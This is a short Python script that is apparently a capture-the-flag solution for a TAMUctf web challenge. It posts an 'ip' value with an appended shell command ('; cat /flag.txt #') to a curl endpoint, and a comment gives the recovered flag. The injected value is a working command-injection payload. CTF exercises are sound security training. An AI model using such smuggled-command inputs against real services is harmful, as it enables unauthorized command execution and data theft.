import requests
from urllib import parse
url = "http://connect.tamuctf.com/api/curl"
headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'}
fdata = {
    "ip": "www.google.com; cat /flag.txt #"
}
data = parse.urlencode(fdata)
req = requests.post(url=url,headers=headers, data=data)
print(req.status_code)
print(req.text)

# Flag: gigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}